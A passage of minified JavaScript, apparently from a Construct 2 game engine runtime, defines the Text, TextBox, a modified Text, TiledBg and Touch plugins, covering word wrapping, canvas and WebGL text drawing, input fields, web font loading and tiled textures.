r,o,a=n+this.height,h=this.pxHeight;for(h+=this.line_height_offset,1===this.valign?n+=Math.max(this.height/2-this.lines.length*h/2,0):2===this.valign&&(n+=Math.max(this.height-this.lines.length*h-2,0)),o=0;o<this.lines.length&&(r=s,1===this.halign?r=s+(this.width-this.lines[o].width)/2:2===this.halign&&(r=s+(this.width-this.lines[o].width)),t.fillText(this.lines[o].text,r,n),!(a-h<=(n+=h)));o++);0===this.angle&&!e||t.restore(),this.last_render_tick=this.runtime.tickcount},e.drawGL=function(t){var e,i,s,n,r,o,a,h,c,l,u,p,d,g,f,m,y;this.width<1||this.height<1||(p=this.text_changed||this.need_text_redraw,this.need_text_redraw=!1,e=this.layer.getScale(),i=this.layer.getAngle(),s=this.rcTex,n=e*this.width,r=e*this.height,o=Math.ceil(n),a=Math.ceil(r),d=Math.abs(o),g=Math.abs(a),f=this.runtime.draw_width/2,m=this.runtime.draw_height/2,this.myctx||(this.mycanvas=document.createElement("canvas"),this.mycanvas.width=d,this.mycanvas.height=g,this.lastwidth=d,this.lastheight=g,p=!0,this.myctx=this.mycanvas.getContext("2d")),d===this.lastwidth&&g===this.lastheight||(this.mycanvas.width=d,this.mycanvas.height=g,this.mytex&&(t.deleteTexture(this.mytex),this.mytex=null),p=!0),p&&(this.myctx.clearRect(0,0,d,g),this.draw(this.myctx,!0),this.mytex||(this.mytex=t.createEmptyTexture(d,g,this.runtime.linearSampling,this.runtime.isMobile)),t.videoToTexture(this.mycanvas,this.mytex,this.runtime.isMobile)),this.lastwidth=d,this.lastheight=g,t.setTexture(this.mytex),t.setOpacity(this.opacity),t.resetModelView(),t.translate(-f,-m),t.updateModelView(),y=this.bquad,h=this.layer.layerToCanvas(y.tlx,y.tly,!0,!0),c=this.layer.layerToCanvas(y.tlx,y.tly,!1,!0),l=this.layer.layerToCanvas(y.trx,y.try_,!0,!0),u=this.layer.layerToCanvas(y.trx,y.try_,!1,!0),p=this.layer.layerToCanvas(y.brx,y.bry,!0,!0),d=this.layer.layerToCanvas(y.brx,y.bry,!1,!0),g=this.layer.layerToCanvas(y.blx,y.bly,!0,!0),f=this.layer.layerToCanvas(y.blx,y.bly,!1,!0),(this.runtime.pixel_rounding||0===this.angle&&0===i)&&(h+=m=(h+.5|0)-h,c+=y=(c+.5|0)-c,l+=m,u+=y,p+=m,d+=y,g+=m,f+=y),0===this.angle&&0===i?(p=l=h+o,g=h,f=d=(u=c)+a,s.right=1,s.bottom=1):(s.right=n/o,s.bottom=r/a),t.quadTex(h,c,l,u,p,d,g,f,s),t.resetModelView(),t.scale(e,e),t.rotateZ(-this.layer.getAngle()),t.translate((this.layer.viewLeft+this.layer.viewRight)/-2,(this.layer.viewTop+this.layer.viewBottom)/-2),t.updateModelView(),this.last_render_tick=this.runtime.tickcount)};var u=[];t.TokeniseWords=function(t){cr.clearArray(u);for(var e,i="",s=0;s<t.length;)if("\n"===(e=t.charAt(s)))i.length&&(u.push(i),i=""),u.push("\n"),++s;else if(" "===e||"\t"===e||"-"===e){for(;i+=t.charAt(s),s++,s<t.length&&(" "===t.charAt(s)||"\t"===t.charAt(s)););u.push(i),i=""}else s<t.length&&(i+=e,s++);i.length&&u.push(i)};var i=[];function p(){return i.length?i.pop():{}}function d(t){i.push(t)}function a(t){for(var e=0,i=t.length;e<i;e++)d(t[e]);cr.clearArray(t)}function g(t){return t.length&&" "===t.charAt(t.length-1)?t.substring(0,t.length-1):t}function s(){}function n(){}function r(){}t.WordWrap=function(t,e,i,s,n){if(t&&t.length)if(s<=2)a(e);else{if(t.length<=100&&-1===t.indexOf("\n")){var r=i.measureText(t).width;if(r<=s)return a(e),e.push(p()),e[0].text=t,void(e[0].width=r)}this.WrapText(t,e,i,s,n)}else a(e)},t.WrapText=function(t,e,i,s,n){for(var r,o,a=n?(this.TokeniseWords(t),u):t,h="",c=0,l=0;l<a.length;l++)"\n"!==a[l]?(r=h,h+=a[l],s<=i.measureText(h).width&&(c>=e.length&&e.push(p()),r=g(r),(o=e[c]).text=r,o.width=i.measureText(r).width,c++,h=a[l],n||" "!==h||(h=""))):(c>=e.length&&e.push(p()),h=g(h),(o=e[c]).text=h,o.width=i.measureText(h).width,c++,h="");for(h.length&&(c>=e.length&&e.push(p()),h=g(h),(o=e[c]).text=h,o.width=i.measureText(h).width,c++),l=c;l<e.length;l++)d(e[l]);e.length=c},s.prototype.CompareText=function(t,e){return e?this.text==t:cr.equals_nocase(this.text,t)},t.cnds=new s,n.prototype.SetText=function(t){cr.is_number(t)&&t<1e9&&(t=Math.round(1e10*t)/1e10);t=t.toString();this.text!==t&&(this.text=t,this.text_changed=!0,this.runtime.redraw=!0)},n.prototype.AppendText=function(t){cr.is_number(t)&&(t=Math.round(1e10*t)/1e10);t=t.toString();t&&(this.text+=t,this.text_changed=!0,this.runtime.redraw=!0)},n.prototype.SetFontFace=function(t,e){var i="";switch(e){case 1:i="bold";break;case 2:i="italic";break;case 3:i="bold italic"}t===this.facename&&i===this.fontstyle||(this.facename=t,this.fontstyle=i,this.updateFont())},n.prototype.SetFontSize=function(t){this.ptSize!==t&&(this.ptSize=t,this.pxHeight=Math.ceil(this.ptSize/72*96)+4,this.updateFont())},n.prototype.SetFontColor=function(t){t="rgb("+cr.GetRValue(t).toString()+","+cr.GetGValue(t).toString()+","+cr.GetBValue(t).toString()+")";t!==this.color&&(this.color=t,this.need_text_redraw=!0,this.runtime.redraw=!0)},n.prototype.SetWebFont=function(t,e){if(this.runtime.isDomFree)cr.logexport("[Construct 2] Text plugin: 'Set web font' not supported on this platform - the action has been ignored");else{function i(){s.runtime.redraw=!0,s.text_changed=!0}var s=this;if(o.hasOwnProperty(e)){var n="'"+t+"'";if(this.facename!==n){this.facename=n,this.updateFont();for(var r=1;r<10;r++)setTimeout(i,100*r),setTimeout(i,1e3*r)}}else{n=document.createElement("link");n.href=e,n.rel="stylesheet",n.type="text/css",n.onload=i,document.getElementsByTagName("head")[0].appendChild(n),o[e]=!0,this.facename="'"+t+"'",this.updateFont();for(r=1;r<10;r++)setTimeout(i,100*r),setTimeout(i,1e3*r)}}},n.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},t.acts=new n,r.prototype.Text=function(t){t.set_string(this.text)},r.prototype.FaceName=function(t){t.set_string(this.facename)},r.prototype.FaceSize=function(t){t.set_int(this.ptSize)},r.prototype.TextWidth=function(t){for(var e,i=0,s=0,n=this.lines.length;s<n;s++)i<(e=this.lines[s].width)&&(i=e);t.set_int(i)},r.prototype.TextHeight=function(t){t.set_int(this.lines.length*(this.pxHeight+this.line_height_offset)-this.line_height_offset)},t.exps=new r}(),cr.plugins_.TextBox=function(t){this.runtime=t},function(){var t=cr.plugins_.TextBox.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,n=["text","password","email","number","tel","url"];function i(){}function s(){}function r(){}-1<navigator.userAgent.indexOf("MSIE 9")&&(n[2]="text",n[3]="text",n[4]="text",n[5]="text"),e.onCreate=function(){var t,e,i,s;this.runtime.isDomFree?cr.logexport("[Construct 2] Textbox plugin not supported on this platform - the object will not be created"):(6===this.properties[7]?(this.elem=document.createElement("textarea"),jQuery(this.elem).css("resize","none")):(this.elem=document.createElement("input"),this.elem.type=n[this.properties[7]]),this.elem.id=this.properties[9],jQuery(this.elem).appendTo(this.runtime.canvasdiv||"body"),this.elem.autocomplete="off",this.elem.value=this.properties[0],this.elem.placeholder=this.properties[1],this.elem.title=this.properties[2],this.elem.disabled=0===this.properties[4],this.elem.readOnly=1===this.properties[5],this.elem.spellcheck=1===this.properties[6],this.autoFontSize=0!==this.properties[8],this.element_hidden=!1,0===this.properties[3]&&(jQuery(this.elem).hide(),this.visible=!1,this.element_hidden=!0),t=function(){e.runtime.trigger(cr.plugins_.TextBox.prototype.cnds.OnTextChanged,e)},(e=this).elem.oninput=t,-1!==navigator.userAgent.indexOf("MSIE")&&(this.elem.oncut=t),this.elem.onclick=(i=this,function(t){t.stopPropagation(),i.runtime.isInUserInputEvent=!0,i.runtime.trigger(cr.plugins_.TextBox.prototype.cnds.OnClicked,i),i.runtime.isInUserInputEvent=!1}),this.elem.ondblclick=(s=this,function(t){t.stopPropagation(),s.runtime.isInUserInputEvent=!0,s.runtime.trigger(cr.plugins_.TextBox.prototype.cnds.OnDoubleClicked,s),s.runtime.isInUserInputEvent=!1}),this.elem.addEventListener("touchstart",function(t){t.stopPropagation()},!1),this.elem.addEventListener("touchmove",function(t){t.stopPropagation()},!1),this.elem.addEventListener("touchend",function(t){t.stopPropagation()},!1),jQuery(this.elem).mousedown(function(t){t.stopPropagation()}),jQuery(this.elem).mouseup(function(t){t.stopPropagation()}),jQuery(this.elem).keydown(function(t){13!==t.which&&27!=t.which&&t.stopPropagation()}),jQuery(this.elem).keyup(function(t){13!==t.which&&27!=t.which&&t.stopPropagation()}),this.lastLeft=0,this.lastTop=0,this.lastRight=0,this.lastBottom=0,this.lastWinWidth=0,this.lastWinHeight=0,this.updatePosition(!0),this.runtime.tickMe(this))},e.saveToJSON=function(){return{text:this.elem.value,placeholder:this.elem.placeholder,tooltip:this.elem.title,disabled:!!this.elem.disabled,readonly:!!this.elem.readOnly,spellcheck:!!this.elem.spellcheck}},e.loadFromJSON=function(t){this.elem.value=t.text,this.elem.placeholder=t.placeholder,this.elem.title=t.tooltip,this.elem.disabled=t.disabled,this.elem.readOnly=t.readonly,this.elem.spellcheck=t.spellcheck},e.onDestroy=function(){this.runtime.isDomFree||(jQuery(this.elem).remove(),this.elem=null)},e.tick=function(){this.updatePosition()},e.updatePosition=function(t){if(!this.runtime.isDomFree){var e=this.layer.layerToCanvas(this.x,this.y,!0),i=this.layer.layerToCanvas(this.x,this.y,!1),s=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!0),n=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!1),r=this.runtime.width/this.runtime.devicePixelRatio,o=this.runtime.height/this.runtime.devicePixelRatio;if(!this.visible||!this.layer.visible||s<=0||n<=0||r<=e||o<=i)return this.element_hidden||jQuery(this.elem).hide(),void(this.element_hidden=!0);e<1&&(e=1),i<1&&(i=1),r<=s&&(s=r-1),o<=n&&(n=o-1);r=window.innerWidth,o=window.innerHeight;t||this.lastLeft!==e||this.lastTop!==i||this.lastRight!==s||this.lastBottom!==n||this.lastWinWidth!==r||this.lastWinHeight!==o?(this.lastLeft=e,this.lastTop=i,this.lastRight=s,this.lastBottom=n,this.lastWinWidth=r,this.lastWinHeight=o,this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1),r=Math.round(e)+jQuery(this.runtime.canvas).offset().left,o=Math.round(i)+jQuery(this.runtime.canvas).offset().top,jQuery(this.elem).css("position","absolute"),jQuery(this.elem).offset({left:r,top:o}),jQuery(this.elem).width(Math.round(s-e)),jQuery(this.elem).height(Math.round(n-i)),this.autoFontSize&&jQuery(this.elem).css("font-size",this.layer.getScale(!0)/this.runtime.devicePixelRatio-.2+"em")):this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1)}},e.draw=function(t){},e.drawGL=function(t){},i.prototype.CompareText=function(t,e){return!this.runtime.isDomFree&&(0===e?cr.equals_nocase(this.elem.value,t):this.elem.value===t)},i.prototype.OnTextChanged=function(){return!0},i.prototype.OnClicked=function(){return!0},i.prototype.OnDoubleClicked=function(){return!0},t.cnds=new i,s.prototype.SetText=function(t){this.runtime.isDomFree||(this.elem.value=t)},s.prototype.SetPlaceholder=function(t){this.runtime.isDomFree||(this.elem.placeholder=t)},s.prototype.SetTooltip=function(t){this.runtime.isDomFree||(this.elem.title=t)},s.prototype.SetVisible=function(t){this.runtime.isDomFree||(this.visible=0!==t)},s.prototype.SetEnabled=function(t){this.runtime.isDomFree||(this.elem.disabled=0===t)},s.prototype.SetReadOnly=function(t){this.runtime.isDomFree||(this.elem.readOnly=0===t)},s.prototype.SetFocus=function(){this.runtime.isDomFree||this.elem.focus()},s.prototype.SetBlur=function(){this.runtime.isDomFree||this.elem.blur()},s.prototype.SetCSSStyle=function(t,e){this.runtime.isDomFree||jQuery(this.elem).css(t,e)},s.prototype.ScrollToBottom=function(){this.runtime.isDomFree||(this.elem.scrollTop=this.elem.scrollHeight)},t.acts=new s,r.prototype.Text=function(t){this.runtime.isDomFree?t.set_string(""):t.set_string(this.elem.value)},t.exps=new r}(),cr.plugins_.TextModded=function(t){this.runtime=t},function(){var t=cr.plugins_.TextModded.prototype;t.onCreate=function(){t.acts.SetWidth=function(t){this.width!==t&&(this.width=t,this.text_changed=!0,this.set_bbox_changed())}},t.Type=function(t){this.plugin=t,this.runtime=t.runtime},(e=t.Type.prototype).onCreate=function(){},e.onLostWebGLContext=function(){if(!this.is_family)for(var t,e=0,i=this.instances.length;e<i;e++)(t=this.instances[e]).mycanvas=null,t.myctx=null,t.mytex=null},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.recycled?cr.clearArray(this.lines):this.lines=[],this.text_changed=!0};var e=t.Instance.prototype,o={};e.onCreate=function(){this.text=this.properties[0],this.visible=0===this.properties[1],this.font=this.properties[2],this.color=this.properties[3],this.clamp=0===this.properties[4],this.clamp?(this.halign=cr.clamp(this.properties[5],0,100),this.valign=cr.clamp(this.properties[6],0,100)):(this.halign=this.properties[5],this.valign=this.properties[6]),this.wrapbyword=0===this.properties[8],this.nowrap=2===this.properties[8],this.wrap=this.properties[8],this.lastwidth=this.width,this.lastwrapwidth=this.width,this.lastheight=this.height,this.line_height_offset=this.properties[9],this.facename="",this.fontstyle="",this.ptSize=0,this.textWidth=0,this.textHeight=0,this.parseFont(),this.mycanvas=null,this.myctx=null,this.mytex=null,this.need_text_redraw=!1,this.last_render_tick=this.runtime.tickcount,this.recycled?this.rcTex.set(0,0,1,1):this.rcTex=new cr.rect(0,0,1,1),this.runtime.glwrap&&this.runtime.tickMe(this)},e.parseFont=function(){for(var t=this.font.split(" "),e=0;e<t.length;e++)if("pt"===t[e].substr(t[e].length-2,2)){for(this.ptSize=parseInt(t[e].substr(0,t[e].length-2)),this.pxHeight=Math.ceil(this.ptSize/72*96)+4,0<e&&(this.fontstyle=t[e-1]),this.facename=t[e+1],e+=2;e<t.length;e++)this.facename+=" "+t[e];break}},e.saveToJSON=function(){return{t:this.text,f:this.font,c:this.color,ha:this.halign,va:this.valign,clamp:this.clamp,wr:this.wrapbyword,nw:this.nowrap,wrap:this.wrap,lho:this.line_height_offset,fn:this.facename,fs:this.fontstyle,ps:this.ptSize,pxh:this.pxHeight,tw:this.textWidth,th:this.textHeight,lrt:this.last_render_tick}},e.loadFromJSON=function(t){this.text=t.t,this.font=t.f,this.color=t.c,this.halign=t.ha,this.valign=t.va,this.clamp=t.clamp,this.wrapbyword=t.wr,this.nowrap=t.nw,this.wrap=t.wrap,this.line_height_offset=t.lho,this.facename=t.fn,this.fontstyle=t.fs,this.ptSize=t.ps,this.pxHeight=t.pxh,this.textWidth=t.tw,this.textHeight=t.th,this.last_render_tick=t.lrt,this.text_changed=!0,this.lastwidth=this.width,this.lastwrapwidth=this.width,this.lastheight=this.height},e.tick=function(){var t,e;this.runtime.glwrap&&this.mytex&&300<=this.runtime.tickcount-this.last_render_tick&&(t=this.layer,this.update_bbox(),((e=this.bbox).right<t.viewLeft||e.bottom<t.viewTop||e.left>t.viewRight||e.top>t.viewBottom)&&(this.runtime.glwrap.deleteTexture(this.mytex),this.mytex=null,this.myctx=null,this.mycanvas=null))},e.onDestroy=function(){this.myctx=null,this.mycanvas=null,this.runtime.glwrap&&this.mytex&&this.runtime.glwrap.deleteTexture(this.mytex),this.mytex=null},e.updateFont=function(){this.font=this.fontstyle+" "+this.ptSize.toString()+"pt "+this.facename,this.text_changed=!0,this.runtime.redraw=!0},e.draw=function(t,e){t.font=this.font,t.textBaseline="top",t.fillStyle=this.color,t.globalAlpha=e?1:this.opacity;var i=1;e&&(i=Math.abs(this.layer.getScale()),t.save(),t.scale(i,i)),!this.text_changed&&this.width===this.lastwrapwidth||(this.type.plugin.WordWrap(this.text,this.lines,t,this.width,this.wrapbyword,this.nowrap),this.text_changed=!1,this.lastwrapwidth=this.width),this.update_bbox();var s=e?0:this.bquad.tlx,n=e?0:this.bquad.tly;this.runtime.pixel_rounding&&(s=s+.5|0,n=n+.5|0),0===this.angle||e||(t.save(),t.translate(s,n),t.rotate(this.angle),n=s=0);var r,o,a=n+this.height,h=this.pxHeight;h+=this.line_height_offset;i=0;for(50<this.valign&&(i=2*(this.valign-50)/50),n+=Math.max(this.height*this.valign/100-this.lines.length*h*this.valign/100-i,0),o=0;o<this.lines.length&&(r=s+(this.width-this.lines[o].width)*this.halign/100,t.fillText(this.lines[o].text,r,n),!(a-h<=(n+=h)));o++);0===this.angle&&!e||t.restore(),this.last_render_tick=this.runtime.tickcount},e.drawGL=function(t){var e,i,s,n,r,o,a,h,c,l,u,p,d,g,f,m,y;this.width<1||this.height<1||(p=this.text_changed||this.need_text_redraw,this.need_text_redraw=!1,e=this.layer.getScale(),i=this.layer.getAngle(),s=this.rcTex,n=e*this.width,r=e*this.height,o=Math.ceil(n),a=Math.ceil(r),d=Math.abs(o),g=Math.abs(a),f=this.runtime.draw_width/2,m=this.runtime.draw_height/2,this.myctx||(this.mycanvas=document.createElement("canvas"),this.mycanvas.width=d,this.mycanvas.height=g,this.lastwidth=d,this.lastheight=g,p=!0,this.myctx=this.mycanvas.getContext("2d")),d===this.lastwidth&&g===this.lastheight||(this.mycanvas.width=d,this.mycanvas.height=g,this.mytex&&(t.deleteTexture(this.mytex),this.mytex=null),p=!0),p&&(this.myctx.clearRect(0,0,d,g),this.draw(this.myctx,!0),this.mytex||(this.mytex=t.createEmptyTexture(d,g,this.runtime.linearSampling,this.runtime.isMobile)),t.videoToTexture(this.mycanvas,this.mytex,this.runtime.isMobile)),this.lastwidth=d,this.lastheight=g,t.setTexture(this.mytex),t.setOpacity(this.opacity),t.resetModelView(),t.translate(-f,-m),t.updateModelView(),y=this.bquad,h=this.layer.layerToCanvas(y.tlx,y.tly,!0,!0),c=this.layer.layerToCanvas(y.tlx,y.tly,!1,!0),l=this.layer.layerToCanvas(y.trx,y.try_,!0,!0),u=this.layer.layerToCanvas(y.trx,y.try_,!1,!0),p=this.layer.layerToCanvas(y.brx,y.bry,!0,!0),d=this.layer.layerToCanvas(y.brx,y.bry,!1,!0),g=this.layer.layerToCanvas(y.blx,y.bly,!0,!0),f=this.layer.layerToCanvas(y.blx,y.bly,!1,!0),(this.runtime.pixel_rounding||0===this.angle&&0===i)&&(h+=m=(h+.5|0)-h,c+=y=(c+.5|0)-c,l+=m,u+=y,p+=m,d+=y,g+=m,f+=y),0===this.angle&&0===i?(p=l=h+o,g=h,f=d=(u=c)+a,s.right=1,s.bottom=1):(s.right=n/o,s.bottom=r/a),t.quadTex(h,c,l,u,p,d,g,f,s),t.resetModelView(),t.scale(e,e),t.rotateZ(-this.layer.getAngle()),t.translate((this.layer.viewLeft+this.layer.viewRight)/-2,(this.layer.viewTop+this.layer.viewBottom)/-2),t.updateModelView(),this.last_render_tick=this.runtime.tickcount)};var u=[];t.TokeniseWords=function(t){cr.clearArray(u);for(var e,i="",s=0;s<t.length;)if("\n"===(e=t.charAt(s)))i.length&&(u.push(i),i=""),u.push("\n"),++s;else if(" "===e||"\t"===e||"-"===e){for(;i+=t.charAt(s),s++,s<t.length&&(" "===t.charAt(s)||"\t"===t.charAt(s)););u.push(i),i=""}else s<t.length&&(i+=e,s++);i.length&&u.push(i)};var i=[];function p(){return i.length?i.pop():{}}function d(t){i.push(t)}function a(t){for(var e=0,i=t.length;e<i;e++)d(t[e]);cr.clearArray(t)}function g(t){return t.length&&" "===t.charAt(t.length-1)?t.substring(0,t.length-1):t}function s(){}function n(){}function r(){}t.WordWrap=function(t,e,i,s,n,r){if(t&&t.length)if(s<=2)a(e);else{var o;if(t.length<=100&&-1===t.indexOf("\n"))if((o=i.measureText(t).width)<=s)return a(e),e.push(p()),e[0].text=t,void(e[0].width=o);r?(o=i.measureText(t).width,a(e),e.push(p()),e[0].text=t,e[0].width=o):this.WrapText(t,e,i,s,n)}else a(e)},t.WrapText=function(t,e,i,s,n){for(var r,o,a=n?(this.TokeniseWords(t),u):t,h="",c=0,l=0;l<a.length;l++)"\n"!==a[l]?(r=h,h+=a[l],s<=i.measureText(h).width&&(c>=e.length&&e.push(p()),r=g(r),(o=e[c]).text=r,o.width=i.measureText(r).width,c++,h=a[l],n||" "!==h||(h=""))):(c>=e.length&&e.push(p()),h=g(h),(o=e[c]).text=h,o.width=i.measureText(h).width,c++,h="");for(h.length&&(c>=e.length&&e.push(p()),h=g(h),(o=e[c]).text=h,o.width=i.measureText(h).width,c++),l=c;l<e.length;l++)d(e[l]);e.length=c},s.prototype.CompareText=function(t,e){return e?this.text==t:cr.equals_nocase(this.text,t)},t.cnds=new s,n.prototype.SetText=function(t){cr.is_number(t)&&t<1e9&&(t=Math.round(1e10*t)/1e10);t=t.toString();this.text!==t&&(this.text=t,this.text_changed=!0,this.runtime.redraw=!0)},n.prototype.AppendText=function(t){cr.is_number(t)&&(t=Math.round(1e10*t)/1e10);t=t.toString();t&&(this.text+=t,this.text_changed=!0,this.runtime.redraw=!0)},n.prototype.SetFontFace=function(t,e){var i="";switch(e){case 1:i="bold";break;case 2:i="italic";break;case 3:i="bold italic"}t===this.facename&&i===this.fontstyle||(this.facename=t,this.fontstyle=i,this.updateFont())},n.prototype.SetFontSize=function(t){this.ptSize!==t&&(this.ptSize=t,this.pxHeight=Math.ceil(this.ptSize/72*96)+4,this.updateFont())},n.prototype.SetFontColor=function(t){t="rgb("+cr.GetRValue(t).toString()+","+cr.GetGValue(t).toString()+","+cr.GetBValue(t).toString()+")";t!==this.color&&(this.color=t,this.need_text_redraw=!0,this.runtime.redraw=!0)},n.prototype.SetHorAl=function(t){this.halign=this.clamp?cr.clamp(t,0,100):t,this.need_text_redraw=!0,this.runtime.redraw=!0},n.prototype.SetVerAl=function(t){this.valign=this.clamp?cr.clamp(t,0,100):t,this.need_text_redraw=!0,this.runtime.redraw=!0},n.prototype.SetAl=function(t,e){this.halign=this.clamp?cr.clamp(t,0,100):t,this.valign=this.clamp?cr.clamp(e,0,100):e,this.need_text_redraw=!0,this.runtime.redraw=!0},n.prototype.SetWrap=function(t){this.wrapbyword=0===t,this.nowrap=2===t,this.need_text_redraw=!0,this.runtime.redraw=!0,this.text_changed=!0},n.prototype.SetClamp=function(t){this.clamp=0===t,this.halign=this.clamp?cr.clamp(this.halign,0,100):this.halign,this.valign=this.clamp?cr.clamp(this.valign,0,100):this.valign,this.need_text_redraw=!0,this.runtime.redraw=!0,this.text_changed=!0},n.prototype.SetHotspot=function(t){this.SetHotspot(GetHotspot(t))},n.prototype.SetWebFont=function(t,e){if(this.runtime.isDomFree)cr.logexport("[Construct 2] Text plugin: 'Set web font' not supported on this platform - the action has been ignored");else{function i(){s.runtime.redraw=!0,s.text_changed=!0}var s=this;if(o.hasOwnProperty(e)){var n="'"+t+"'";if(this.facename!==n){this.facename=n,this.updateFont();for(var r=1;r<10;r++)setTimeout(i,100*r),setTimeout(i,1e3*r)}}else{n=document.createElement("link");n.href=e,n.rel="stylesheet",n.type="text/css",n.onload=i,document.getElementsByTagName("head")[0].appendChild(n),o[e]=!0,this.facename="'"+t+"'",this.updateFont();for(r=1;r<10;r++)setTimeout(i,100*r),setTimeout(i,1e3*r)}}},n.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},t.acts=new n,r.prototype.Text=function(t){t.set_string(this.text)},r.prototype.HAlign=function(t){t.set_int(this.halign)},r.prototype.VAlign=function(t){t.set_int(this.valign)},r.prototype.FaceName=function(t){t.set_string(this.facename)},r.prototype.FaceSize=function(t){t.set_int(this.ptSize)},r.prototype.LineHeight=function(t){t.set_int(this.pxHeight+this.line_height_offset)},r.prototype.TextWidth=function(t){for(var e,i=0,s=0,n=this.lines.length;s<n;s++)i<(e=this.lines[s].width)&&(i=e);t.set_int(i)},r.prototype.TextHeight=function(t){t.set_int(this.lines.length*(this.pxHeight+this.line_height_offset)-this.line_height_offset)},t.exps=new r}(),cr.plugins_.TiledBg=function(t){this.runtime=t},function(){var t=cr.plugins_.TiledBg.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime};var e=t.Type.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.is_family||(this.texture_img=new Image,this.texture_img.cr_filesize=this.texture_filesize,this.runtime.waitForImageLoad(this.texture_img,this.texture_file),this.pattern=null,this.webGL_texture=null)},e.onLostWebGLContext=function(){this.is_family||(this.webGL_texture=null)},e.onRestoreWebGLContext=function(){var t,e;if(!this.is_family&&this.instances.length)for(this.webGL_texture||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!0,this.runtime.linearSampling,this.texture_pixelformat)),t=0,e=this.instances.length;t<e;t++)this.instances[t].webGL_texture=this.webGL_texture},e.loadTextures=function(){this.is_family||this.webGL_texture||!this.runtime.glwrap||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!0,this.runtime.linearSampling,this.texture_pixelformat))},e.unloadTextures=function(){this.is_family||this.instances.length||!this.webGL_texture||(this.runtime.glwrap.deleteTexture(this.webGL_texture),this.webGL_texture=null)},e.preloadCanvas2D=function(t){t.drawImage(this.texture_img,0,0)},t.Instance=function(t){this.type=t,this.runtime=t.runtime},(e=t.Instance.prototype).onCreate=function(){this.visible=0===this.properties[0],this.rcTex=new cr.rect(0,0,0,0),this.has_own_texture=!1,this.texture_img=this.type.texture_img,this.runtime.glwrap?(this.type.loadTextures(),this.webGL_texture=this.type.webGL_texture):(this.type.pattern||(this.type.pattern=this.runtime.ctx.createPattern(this.type.texture_img,"repeat")),this.pattern=this.type.pattern)},e.afterLoad=function(){this.has_own_texture=!1,this.texture_img=this.type.texture_img},e.onDestroy=function(){this.runtime.glwrap&&this.has_own_texture&&this.webGL_texture&&(this.runtime.glwrap.deleteTexture(this.webGL_texture),this.webGL_texture=null)},e.draw=function(t){t.globalAlpha=this.opacity,t.save(),t.fillStyle=this.pattern;var e=this.x,i=this.y;this.runtime.pixel_rounding&&(e=Math.round(e),i=Math.round(i));var s=-(this.hotspotX*this.width),n=-(this.hotspotY*this.height),r=s%this.texture_img.width,o=n%this.texture_img.height;r<0&&(r+=this.texture_img.width),o<0&&(o+=this.texture_img.height),t.translate(e,i),t.rotate(this.angle),t.translate(r,o),t.fillRect(s-r,n-o,this.width,this.height),t.restore()},e.drawGL_earlyZPass=function(t){this.drawGL(t)},e.drawGL=function(t){t.setTexture(this.webGL_texture),t.setOpacity(this.opacity);var e=this.rcTex;e.right=this.width/this.texture_img.width,e.bottom=this.height/this.texture_img.height;var i,s,n=this.bquad;this.runtime.pixel_rounding?(i=Math.round(this.x)-this.x,s=Math.round(this.y)-this.y,t.quadTex(n.tlx+i,n.tly+s,n.trx+i,n.try_+s,n.brx+i,n.bry+s,n.blx+i,n.bly+s,e)):t.quadTex(n.tlx,n.tly,n.trx,n.try_,n.brx,n.bry,n.blx,n.bly,e)},i.prototype.OnURLLoaded=function(){return!0},t.cnds=new i,s.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},s.prototype.LoadURL=function(t,e){var i=new Image,s=this;i.onload=function(){s.texture_img=i,s.runtime.glwrap?(s.has_own_texture&&s.webGL_texture&&s.runtime.glwrap.deleteTexture(s.webGL_texture),s.webGL_texture=s.runtime.glwrap.loadTexture(i,!0,s.runtime.linearSampling)):s.pattern=s.runtime.ctx.createPattern(i,"repeat"),s.has_own_texture=!0,s.runtime.redraw=!0,s.runtime.trigger(cr.plugins_.TiledBg.prototype.cnds.OnURLLoaded,s)},"data:"!==t.substr(0,5)&&0===e&&(i.crossOrigin="anonymous"),this.runtime.setImageSrc(i,t)},t.acts=new s,n.prototype.ImageWidth=function(t){t.set_float(this.texture_img.width)},n.prototype.ImageHeight=function(t){t.set_float(this.texture_img.height)},t.exps=new n}(),cr.plugins_.Touch=function(t){this.runtime=t},function(){var t=cr.plugins_.Touch.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.touches=[],this.mouseDown=!1};var e=t.Instance.prototype,l={left:0,top:0};e.findTouch=function(t){for(var e=0,i=this.touches.length;e<i;e++)if(this.touches[e].id===t)return e;return-1};var i=0,s=0,n=0;function a(t){i=t.x,s=t.y,n=t.z}var r=[];function h(t,e,i,s){var n=r.length?r.pop():new c;return n.init(t,e,i,s),n}function o(t){r.length<100&&r.push(t)}function c(){this.starttime=0,this.time=0,this.lasttime=0,this.startx=0,this.starty=0,this.x=0,this.y=0,this.lastx=0,this.lasty=0,this.id=0,this.startindex=0,this.triggeredHold=!1,this.tooFarForHold=!1}c.prototype.init=function(t,e,i,s){var 